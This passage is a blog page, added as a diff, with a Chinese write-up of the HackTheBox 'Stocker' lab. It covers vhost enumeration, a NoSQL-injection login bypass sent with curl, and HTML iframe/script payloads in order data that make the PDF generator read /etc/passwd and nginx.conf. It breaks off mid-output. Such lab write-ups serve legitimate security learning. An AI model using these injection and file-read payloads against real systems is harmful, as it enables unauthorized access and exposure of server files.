@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+<meta name="referrer" content="no-referrer" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
+  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
+  <link rel="manifest" href="/images/logo_icon.svg">
+  <meta name="msapplication-config" content="/images/logo_icon.svg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="日常记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox_Stocker">
+<meta property="og:url" content="https://yoloyolo.top/2023/03/07/HackTheBox-Stocker/index.html">
+<meta property="og:site_name" content="xXxYOLOxXx">
+<meta property="og:description" content="日常记录">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-07T16:31:16.000Z">
+<meta property="article:modified_time" content="2023-03-07T16:38:07.217Z">
+<meta property="article:author" content="xXxYOLOxXx">
+<meta property="article:tag" content="Pentest">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yoloyolo.top/2023/03/07/HackTheBox-Stocker/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>HackTheBox_Stocker | xXxYOLOxXx</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xXxYOLOxXx</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2023/03/07/HackTheBox-Stocker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xXxYOLOxXx">
+      <meta itemprop="description" content="Explorer for unknown.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xXxYOLOxXx">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox_Stocker
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-03-07 11:31:16 / Modified: 11:38:07" itemprop="dateCreated datePublished" datetime="2023-03-07T11:31:16-05:00">2023-03-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>日常记录</p>
+<a id="more"></a>
+<h1 id="hackthebox_stocker"><a class="markdownIt-Anchor" href="#hackthebox_stocker"></a> HackTheBox_Stocker</h1>
+<h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2>
+<h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.196</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.196</span><br><span class="line">Host is up (1.7s latency).</span><br><span class="line">Not shown: 528 closed ports, 470 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://10.10.11.196/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Tue, 07 Mar 2023 11:42:59 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 178</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;stocker.htb</span><br></pre></td></tr></table></figure>
+<p>跳转至域名<code>stocker.htb</code></p>
+<p>添加域名解析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.196\tstocker.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+<p>枚举路径未得到有效信息</p>
+<h3 id="vhost"><a class="markdownIt-Anchor" href="#vhost"></a> VHOST</h3>
+<p>生成VHOST列表</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vhost.py</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt&quot;</span>)</span><br><span class="line">data = file.read().split()</span><br><span class="line">file.close()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> data:</span><br><span class="line">	print(<span class="string">&quot;10.10.11.196\t%s.stocker.htb&quot;</span> % _)</span><br></pre></td></tr></table></figure>
+<p>备份hosts文件并生成新hosts文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/hosts /etc/hosts.bak</span><br><span class="line">python vhost.py &gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+<p>VHOST扫描程序如下</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># scan.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/etc/hosts&quot;</span>)</span><br><span class="line">data_list = file.read().replace(<span class="string">&quot;10.10.11.196\t&quot;</span>, <span class="string">&quot;&quot;</span>).split()</span><br><span class="line">file.close()</span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> index</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enum</span>():</span></span><br><span class="line">	<span class="keyword">global</span> index</span><br><span class="line">	<span class="keyword">while</span> index &lt; <span class="built_in">len</span>(data_list):</span><br><span class="line">		tmp_vhost = data_list[index]</span><br><span class="line">		index += <span class="number">1</span></span><br><span class="line">		print(index)</span><br><span class="line">		res = req.get(<span class="string">&quot;http://%s/&quot;</span> % tmp_vhost, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;Location&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers <span class="keyword">or</span> res.headers[<span class="string">&quot;Location&quot;</span>] != <span class="string">&quot;http://stocker.htb&quot;</span>:</span><br><span class="line">			print(tmp_vhost)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	t = threading.Thread(target=enum)</span><br><span class="line">	threads.append(t)</span><br><span class="line">	t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">	t.join()</span><br></pre></td></tr></table></figure>
+<p>扫描得到VHOST信息如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dev.stocker.htb</span><br></pre></td></tr></table></figure>
+<p>还原hosts文件并添加hosts信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;etc&#x2F;hosts</span><br><span class="line">mv &#x2F;etc&#x2F;hosts.bak &#x2F;etc&#x2F;hosts</span><br><span class="line">echo -e &quot;10.10.11.196\tdev.stocker.htb&quot; &gt; &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2>
+<p>访问<code>dev.stocker.htb</code></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql">https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql</a></p>
+</blockquote>
+<p>NoSQL注入绕过登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb/login --json <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#x27;</span> -v</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">* Connected to dev.stocker.htb (154.38.66.218) port 80 (#0)</span><br><span class="line">&gt; POST &#x2F;login HTTP&#x2F;1.1</span><br><span class="line">&gt; Host: dev.stocker.htb</span><br><span class="line">&gt; User-Agent: curl&#x2F;7.87.0</span><br><span class="line">&gt; Content-Type: application&#x2F;json</span><br><span class="line">&gt; Accept: application&#x2F;json</span><br><span class="line">&gt; Content-Length: 55</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP&#x2F;1.1 302 Found</span><br><span class="line">&lt; Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">&lt; Date: Tue, 07 Mar 2023 14:16:51 GMT</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; X-Powered-By: Express</span><br><span class="line">&lt; Location: &#x2F;stock</span><br><span class="line">&lt; Vary: Accept</span><br><span class="line">&lt; Set-Cookie: connect.sid&#x3D;s%3AfJIaR20mVzvQQCGTeOLbI_uzbKaqBhDQ.1iY7jjKTmOGErnDSTPrCaAgRhmuV8m0NpczGe67RCfg; Path&#x3D;&#x2F;; HttpOnly</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host dev.stocker.htb left intact</span><br></pre></td></tr></table></figure>
+<p>商品加入购物车并支付后生成订单PDF文件<br />
+下载后查看exif信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool 64074bcafc5e45f83e5036a5.pdf</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : 12.49</span><br><span class="line">File Name                       : 64074bcafc5e45f83e5036a5.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 39 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2023:03:07 09:36:19-05:00</span><br><span class="line">File Access Date&#x2F;Time           : 2023:03:07 09:36:31-05:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2023:03:07 09:36:32-05:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application&#x2F;pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 1</span><br><span class="line">Tagged PDF                      : Yes</span><br><span class="line">Creator                         : Chromium</span><br><span class="line">Producer                        : Skia&#x2F;PDF m108</span><br><span class="line">Create Date                     : 2023:03:07 14:36:05+00:00</span><br><span class="line">Modify Date                     : 2023:03:07 14:36:05+00:00</span><br></pre></td></tr></table></figure>
+<p>Skia/PDF XSS to SSRF</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file">https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file</a></p>
+</blockquote>
+<p>修改订单信息如下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;basket&quot;</span>:[&#123;</span><br><span class="line">			<span class="attr">&quot;_id&quot;</span>:<span class="string">&quot;638f116eeb060210cbd83a8d&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;title&quot;</span>:<span class="string">&quot;&lt;iframe style=&#x27;width: 1000px;height: 1000px;&#x27; src=file:///etc/passwd&gt; &quot;</span>,</span><br><span class="line">			<span class="attr">&quot;description&quot;</span>:<span class="string">&quot;It&#x27;s a red cup.&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;image&quot;</span>:<span class="string">&quot;red-cup.jpg../../../../../../etc/passwd&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;price&quot;</span>:<span class="number">-1</span>,</span><br><span class="line">			<span class="attr">&quot;currentStock&quot;</span>:<span class="number">4</span>,</span><br><span class="line">			<span class="attr">&quot;__v&quot;</span>:<span class="number">0</span>,</span><br><span class="line">			<span class="attr">&quot;amount&quot;</span>:<span class="number">1</span></span><br><span class="line">		&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>生成订单PDF文件即可触发SSRF漏洞并获取/etc/passwd信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:106:112:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:107:113::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:108:114::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:109:116::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:111:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">fwupd-refresh:x:112:119:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mongodb:x:113:65534::&#x2F;home&#x2F;mongodb:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">angoose:x:1001:1001:,,,:&#x2F;home&#x2F;angoose:&#x2F;bin&#x2F;bash</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
+<p>读取文件<code>/etc/nginx/nginx.conf</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;basket&quot;</span>:[&#123;</span><br><span class="line">			<span class="attr">&quot;_id&quot;</span>:<span class="string">&quot;638f116eeb060210cbd83a8d&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;title&quot;</span>:<span class="string">&quot;&lt;iframe id=&#x27;myFrame&#x27; style=&#x27;width: 1000px; height: 1000px;&#x27; src=&#x27;file:///etc/nginx/nginx.conf&#x27;&gt;&lt;/iframe&gt;&lt;script&gt;var frame = document.getElementById(&#x27;myFrame&#x27;);frame.onload = function () &#123;var body = frame.contentWindow.document.querySelector(&#x27;body&#x27;);body.style.fontSize = &#x27;0.3rem&#x27;;&#125;;&lt;/script&gt;&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;description&quot;</span>:<span class="string">&quot;It&#x27;s a red cup.&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;image&quot;</span>:<span class="string">&quot;red-cup.jpg../../../../../../etc/passwd&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;price&quot;</span>:<span class="number">-1</span>,</span><br><span class="line">			<span class="attr">&quot;currentStock&quot;</span>:<span class="number">4</span>,</span><br><span class="line">			<span class="attr">&quot;__v&quot;</span>:<span class="number">0</span>,</span><br><span class="line">			<span class="attr">&quot;amount&quot;</span>:<span class="number">1</span></span><br><span class="line">		&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>文件<code>/etc/nginx/nginx.conf</code>内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 